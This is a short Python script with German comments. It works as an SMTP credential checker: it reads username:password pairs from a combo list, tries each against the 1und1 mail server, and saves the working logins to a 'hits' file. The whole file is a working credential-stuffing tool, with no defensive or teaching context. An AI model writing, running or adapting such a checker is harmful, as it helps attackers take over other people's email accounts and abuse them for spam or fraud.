#! /usr/bin/python3

import smtplib
from email.message import EmailMessage

nachricht = EmailMessage()
nachricht.set_content("Text that is in the email")
seed = open("tonlinelist.txt", "r")
seed_arr = seed.read().splitlines()
seed.close()
current = 1

with open("tonlinelist.txt", "r") as f:    
    lines = f.readlines()    
for line in lines :    
    username = line.split(":")[0]    
    password = line.split(":")[1]    
    mail_to = line      
    nachricht["To"] = "butzko@online.de"    
    try:    
            server = smtplib.SMTP_SSL("smtp.1und1.de", 465)    
            #Verbindung zum Server herstellen    
            server.connect("smtp.1und1.de")    
            #Am Server mit seinen persönlichen Zugangsdaten anmelden    
            server.login(username,password)    
            #?    
            server.ehlo()  
            del nachricht["To"]  
            # Versenden der Nachricht    
            #server.send_message(nachricht)    
            # print("Email was successfully sent")    
            print("Email was successfully login")    
            validsmtp=username + ":" + password+"\n"    
            print("Valid smtp : "+validsmtp)    
            with open('hits.txt','a+') as sm :    
                sm.write(validsmtp)    
    except Exception as e:    
            print(e) 
            del nachricht["To"]     